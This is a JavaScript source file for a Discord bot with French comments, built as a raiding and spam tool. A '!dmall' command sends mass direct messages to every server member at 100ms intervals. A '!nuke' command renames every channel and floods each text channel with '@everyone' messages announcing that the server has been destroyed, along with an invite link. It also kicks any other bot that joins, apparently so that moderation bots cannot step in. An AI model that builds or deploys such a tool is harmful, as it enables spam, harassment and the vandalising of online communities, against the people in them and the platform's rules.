const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField } = require('discord.js');
const http = require('http');

// Serveur HTTP pour garder Render actif 24/7
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot Inarrêtable Operational!\n');
}).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
    ]
});

// Liste des IDs autorisés (Toi et 40fd)
const OWNERS = ['1166445202148442112', '330080470983245824'];

client.on('ready', () => {
    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt et inarrêtable.`);
});

// ==========================================
// SÉCURITÉ ACTIVE : KICK INSTANTANÉ DES AUTRES BOTS
// ==========================================
client.on('guildMemberAdd', async member => {
    if (member.user.bot && member.id !== client.user.id) {
        try {
            await member.kick('Anti-bot de sécurité activé : Seul le bot principal est autorisé.');
        } catch (err) {
            console.log(`Impossible de kicker le bot ${member.user.tag}`);
        }
    }
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.guild) return;

    // Vérification si l'auteur fait partie des owners
    const isOwner = OWNERS.includes(message.author.id);

    // ==========================================
    // 1. COMMANDE !DMALL (Ultra-accélérée : 100ms)
    // ==========================================
    if (message.content === '!dmall') {
        if (!isOwner) {
            return message.reply("❌ Tu n'as pas la permission d'utiliser cette commande.");
        }

        await message.reply("💬 **[DMAll Inarrêtable]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");

        const filter = m => m.author.id === message.author.id;
        
        try {
            const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
            const m = collected.first();

            if (m.content.toLowerCase() === 'annuler') {
                return message.channel.send("❌ **Opération DMAll annulée.**");
            }

            const messageTemplate = m.content;

            const previewEmbed = new EmbedBuilder()
                .setColor('#FEE75C')
                .setTitle('⚠️ Confirmation requise - DMAll (Turbo)')
                .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``)
                .setFooter({ text: `Demandé par ${message.author.tag}` });

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('confirm_dmall')
                        .setLabel('Confirmer l\'envoi')
                        .setStyle(ButtonStyle.Success),
                    new ButtonBuilder()
                        .setCustomId('cancel_dmall')
                        .setLabel('Annuler')
                        .setStyle(ButtonStyle.Danger)
                );

            const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });

            const buttonFilter = i => OWNERS.includes(i.user.id);
            const buttonCollector = confirmMsg.createMessageComponentCollector({ filter: buttonFilter, time: 60000, max: 1 });

            buttonCollector.on('collect', async interaction => {
                if (interaction.customId === 'cancel_dmall') {
                    await interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] });
                    return;
                }

                if (interaction.customId === 'confirm_dmall') {
                    await interaction.update({ content: "🚀 **Diffusion DMAll turbo lancée !**", embeds: [], components: [] });

                    const initialEmbed = new EmbedBuilder()
                        .setColor('#5865F2')
                        .setTitle('🚀 Diffusion en cours...')
                        .addFields(
                            { name: '👥 Total', value: 'Calcul...', inline: true },
                            { name: '✅ Envoyés', value: '0', inline: true },
                            { name: '❌ Erreurs', value: '0', inline: true },
                            { name: '📊 Progression', value: '0%', inline: true }
                        );

                    const statusMsg = await message.channel.send({ embeds: [initialEmbed] });

                    try {
                        await message.guild.members.fetch();
                        const members = message.guild.members.cache.filter(member => !member.user.bot);
                        const totalMembers = members.size;

                        let successCount = 0;
                        let failCount = 0;
                        let processed = 0;

                        // Vitesse ultra-rapide à 100ms par message
                        for (const [id, member] of members) {
                            try {
                                const finalMessage = messageTemplate
                                    .replace(/\{mention\}/g, `<@${member.id}>`)
                                    .replace(/\{name\}/g, member.user.username);

                                await member.send(finalMessage);
                                successCount++;
                            } catch (err) {
                                failCount++;
                            }

                            processed++;
                            const percent = Math.round((processed / totalMembers) * 100);

                            if (processed % 15 === 0 || processed === totalMembers) {
                                const updateEmbed = new EmbedBuilder()
                                    .setColor('#5865F2')
                                    .setTitle('🚀 Diffusion en cours...')
                                    .addFields(
                                        { name: '👥 Total cibles', value: `${totalMembers}`, inline: true },
                                        { name: '✅ Envoyés', value: `${successCount}`, inline: true },
                                        { name: '❌ Échecs (MPs fermés)', value: `${failCount}`, inline: true },
                                        { name: '📊 Progression', value: `${percent}% (${processed}/${totalMembers})`, inline: false }
                                    );

                                await statusMsg.edit({ embeds: [updateEmbed] }).catch(() => {});
                            }

                            await new Promise(resolve => setTimeout(resolve, 100)); 
                        }

                        const finalEmbed = new EmbedBuilder()
                            .setColor('#00FF00')
                            .setTitle('✅ Diffusion DMAll Terminée !')
                            .addFields(
                                { name: '👥 Total', value: `${totalMembers}`, inline: true },
                                { name: '✅ Succès', value: `${successCount}`, inline: true },
                                { name: '❌ Échecs', value: `${failCount}`, inline: true }
                            );

                        await statusMsg.edit({ embeds: [finalEmbed] });

                    } catch (error) {
                        console.error(error);
                        message.channel.send("❌ Erreur critique lors de la récupération des membres.");
                    }
                }
            });

        } catch (err) {
            message.channel.send("⌛ Temps écoulé ou erreur. Commande annulée.");
        }
    }

    // ==========================================
    // 2. COMMANDE !NUKE (Destruction totale et instantanée)
    // ==========================================
    if (message.content === '!nuke') {
        if (!isOwner) {
            return message.reply("❌ Tu n'as pas la permission d'utiliser cette commande.");
        }

        await message.reply("💥 **[Nuke Inarrêtable]** Destruction totale du serveur en cours...");

        try {
            const channels = message.guild.channels.cache;

            for (const [id, channel] of channels) {
                // Renommer instantanément le salon
                await channel.setName('ez-by-graveuhq').catch(() => {});

                // Si c'est un salon textuel, balancer les 10 pings everyone en boucle rapide
                if (channel.isTextBased()) {
                    for (let i = 0; i < 10; i++) {
                        await channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
                        await new Promise(resolve => setTimeout(resolve, 50)); // Vitesse quasi-instantanée
                    }
                }
            }
        } catch (error) {
            console.error("Erreur lors du nuke :", error);
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
